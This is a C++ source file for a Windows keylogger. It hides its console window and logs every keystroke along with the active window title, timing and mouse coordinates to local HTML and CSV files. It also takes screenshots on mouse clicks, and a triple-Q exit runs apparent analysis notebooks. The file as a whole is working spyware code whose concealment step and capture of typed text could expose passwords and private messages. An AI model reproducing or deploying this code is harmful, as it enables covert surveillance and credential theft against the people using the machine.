#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <ctime>
#include <time.h>
#include <chrono> // for timer
#include <string.h>
#include <shlobj.h> // used by Windows Controls
#define __STDC_WANT_LIB_EXT1__ 1
#include <stdio.h>
#include <WinUser.h>
#include <utility>
#include <python.h>
#include <conio.h>
#include <direct.h>


using namespace std;

HWND hCurrentWindow;
bool CapsLk = false;
bool flag;
int BackspaceCounter = 0;

void screenshot(){
	cout << 111;
	system("python3 screenshot.py");
}

pair <LONG, LONG> coord_mause(){
	POINT cur_pos;
	GetCursorPos(&cur_pos);
	return make_pair(cur_pos.x, cur_pos.y);
}

int SaveFile(int key, double dwPeriod, double elapsed_seconds)
{
	elapsed_seconds = static_cast<int>(elapsed_seconds); // coordination

	ofstream htmlfile;
	htmlfile.open("../data/html_data_keylogger.html", ios_base::app);
	string Log_html = "<br>";

	ofstream csvfile;
	csvfile.open("../data/csv_data_keylogger.csv", ios_base::app);

	string Log;

	if (hCurrentWindow != GetForegroundWindow())
	{
		hCurrentWindow = GetForegroundWindow(); // the program is still running
		char title[256];
		GetWindowTextA(hCurrentWindow, title, sizeof(title));

		time_t rawtime;
		struct tm timeinfo;
		char buffer[80];

		time(&rawtime);
		localtime_s(&timeinfo, &rawtime);
		strftime(buffer, sizeof(buffer), "%d-%m-%Y %I:%M:%S", &timeinfo);
		string str(buffer);

		string buf = "Запись " + str;
		Log_html += "<font size=\"3\"><br><b>";
		Log_html += buf;
		Log_html += "<br>Имя программы: ";
		Log_html += title;
		Log_html += "</b><br></font>";

		csvfile << "key_code,timing_ms,absolut_ms,coord_X,coord_Y\n";
	}

	if ((GetAsyncKeyState(VK_CAPITAL) & 0x0001) != 0) {
		CapsLk = true;
	}

	// for mouse
	pair <LONG, LONG> p;
	LONG x, y;
	flag = false;
	switch (key) {
	case VK_LBUTTON:{
		flag = true;
		Log += "LBUTTON";
		screenshot();
		break;
	}
	case VK_RBUTTON:{
		flag = true;
		Log += "RBUTTON";
		screenshot(); 
		break;
	}
	case VK_MBUTTON: {
		Log += "MBUTTON";
		break;
	}
		// for numpad digits

	case 96:
		BackspaceCounter = 0;
		Log += "0";
		break;
	case 97:
		BackspaceCounter = 0;
		Log += "1";
		break;
	case 98:
		BackspaceCounter = 0;
		Log += "2";
		break;
	case 99:
		BackspaceCounter = 0;
		Log += "3";
		break;
	case 100:
		BackspaceCounter = 0;
		Log += "4";
		break;
	case 101:
		BackspaceCounter = 0;
		Log += "5";
		break;
	case 102:
		BackspaceCounter = 0;
		Log += "6";
		break;
	case 103:
		BackspaceCounter = 0;
		Log += "7";
		break;
	case 104:
		BackspaceCounter = 0;
		Log += "8";
		break;
	case 105:
		BackspaceCounter = 0;
		Log += "9";
		break;

		// for digits
		
	case 48:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += ")";
		}
		else
			Log += "0";
		break;
	case 49:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "!";
		}
		else
			Log += "1";
		break;
	case 50:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "@";
		}
		else
			Log += "2";
		break;
	case 51:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "#";
		}
		else
			Log += "3";
		break;
	case 52:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "$";
		}
		else
			Log += "4";
		break;
	case 53:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "%";
		}
		else
			Log += "5";
		break;
	case 54:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "^";
		}
		else
			Log += "6";
		break;
	case 55:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "&";
		}
		else
			Log += "7";
		break;
	case 56:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "*";
		}
		else
			Log += "8";
		break;
	case 57:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "(";
		}
		else
			Log += "9";
		break;
		
		// for simple and capital letters
		
	case 65:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#260";
			}
			else
				Log += "A";
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#261";
			}
			else
				Log += "a";
		}
		break;
	case 66:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "B";
		}
		else
			Log += "b";
		break;
	case 67:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#262";
			}
			else {
				Log += "C";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#263";
			}
			else {
				Log += "c";
			}
		}
		break;
	case 68:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "D";
		}
		else
			Log += "d";
		break;
	case 69:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#280";
			}
			else {
				Log += "E";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#281";
			}
			else {
				Log += "e";
			}
		}
		break;
	case 70:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "F";
		}
		else
			Log += "f";
		break;
	case 71:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "G";
		}
		else
			Log += "g";
		break;
	case 72:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "H";
		}
		else
			Log += "h";
		break;
	case 73:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "I";
		}
		else
			Log += "i";
		break;
	case 74:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "J";
		}
		else
			Log += "j";
		break;
	case 75:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "K";
		}
		else
			Log += "k";
		break;
	case 76:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#321";
			}
			else {
				Log += "L";
			}
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&322";
			}
			else {
				Log += "l";
			}
		}
		break;
	case 77:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "M";
		}
		else
			Log += "m";
		break;
	case 78:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#323";
			}
			else {
				Log += "N";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#324";
			}
			else {
				Log += "n";
			}
		}
		break;
	case 79:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#211";
			}
			else {
				Log += "O";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#243";
			}
			else {
				Log += "o";
			}
		}
		break;
	case 80:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "P";
			break;
		}
		else
			Log += "p";
		break;
	case 81:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "Q";
			break;
		}
		else
			Log += "q";
		break;
	case 82:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "R";
			break;
		}
		else
			Log += "r";
		break;
	case 83:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#346";
			}
			else {
				Log += "S";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#347";
			}
			else {
				Log += "s";
			}
		}
		break;
	case 84:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "T";
			break;
		}
		else
			Log += "t";
		break;
	case 85:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "U";
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "€";
			}
			else {
				Log += "u";
			}
		}
		break;
	case 86:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "V";
			break;
		}
		else
			Log += "v";
		break;
	case 87:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "W";
			break;
		}
		else
			Log += "w";
		break;
	case 88:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#377";
			}
			else {
				Log += "X";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#378";
			}
			else {
				Log += "x";
			}
		}
		break;
	case 89:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			Log += "Y";
			break;
		}
		else
			Log += "y";
		break;
	case 90:
		BackspaceCounter = 0;
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT)) {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#379";
			}
			else {
				Log += "Z";
			}
			break;
		}
		else {
			if (GetAsyncKeyState(VK_MENU)) {
				Log += "&#380";
			}
			else {
				Log += "z";
			}
		}

		// for sumbols
	case 13:
		BackspaceCounter = 0;
		Log += "RETURN";
		break;
	case 20:
		BackspaceCounter = 0;
		if (CapsLk == false) {
			CapsLk = true;
			Log += "CAPITAL_1";
		}
		else {
			CapsLk = false;
			Log += "CAPITAL_0";
		}
		break;
	case VK_BACK:
		BackspaceCounter += 1;
		Log += BackspaceCounter + '0';
		Log += "x";
		Log += "BACK";
		break;
	case VK_TAB:
		BackspaceCounter = 0;
		Log += "TAB";
		break;
	case VK_SPACE:
		BackspaceCounter = 0;
		Log += " ";
		break;
	case VK_MULTIPLY:
		BackspaceCounter = 0;
		Log += "*";
		break;
	case VK_ADD:
		BackspaceCounter = 0;
		Log += "+";
		break;
	case VK_SUBTRACT:
		BackspaceCounter = 0;
		Log += "-";
		break;
	case VK_DECIMAL:
		BackspaceCounter = 0;
		Log += ".";
		break;
	case VK_DIVIDE:
		BackspaceCounter = 0;
		Log += "/";
		break;
	default:
		break;
	}

	if (flag == true){
		p = coord_mause();
		x = p.first;
		y = p.second;
		csvfile << Log <<  "," << dwPeriod << "," << elapsed_seconds << "," << to_string(x) << "," << to_string(y) << "\n";
		csvfile.close();

		Log += (" ("+ to_string(x) + ", " + to_string(y) + ")");
		Log_html += Log;
		htmlfile << Log_html << "  -  " << dwPeriod << "  millisec.  -  " << elapsed_seconds << "  millisec.";
		htmlfile.close();
	}
	else {
		Log_html += Log;
		htmlfile << Log_html << "  -  " << dwPeriod << "  millisec.  -  " << elapsed_seconds << "  millisec.";
		htmlfile.close();

		csvfile << Log << "," << dwPeriod << "," << elapsed_seconds << "\n";
		csvfile.close();
	}
	return 0;
}

void stealth() {
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("consoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

void creat_directory() {
	ofstream ofs;
	_mkdir("../data");
	_mkdir("../data/screenshots");
	_mkdir("../data/processed_images");
	ofs.open("buffer.txt", ofstream::out | ofstream::trunc);
	ofs << 1;
	ofs.close();
}

int main(int argc, char* argv[]) {
	stealth();
	creat_directory();
	char i;
	int break_q = 0;
	bool flag;
	DWORD dwStart, dwPeriod;
	auto start = chrono::system_clock::now();
	while (1) {
		dwStart = GetTickCount();
		for (i = 8; i <= 190; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				flag = true;
				if (i == 81) {
					break_q++;
					if (break_q >= 3) {
						system("python3 ../analysis/analysis_images.py");
						Sleep(3000);
						system("jupyter notebook ../analysis/model.ipynb");
						Sleep(5000);
						system("jupyter notebook ../analysis/report.ipynb");
						Sleep(4000);
						exit(0);
					}
			    }
			    else {
				     break_q = 0;
			    }
				break;
			}
		}
		auto end = chrono::system_clock::now();
		chrono::duration<double, milli> elapsed_seconds = end - start;
		dwPeriod = GetTickCount();
		if (dwPeriod > dwStart)
			dwPeriod -= dwStart;
		else
			dwPeriod = dwStart - dwPeriod;
		if (flag == true) {
			SaveFile(i, dwPeriod, elapsed_seconds.count());
		}
	}
	
	return 0;
}
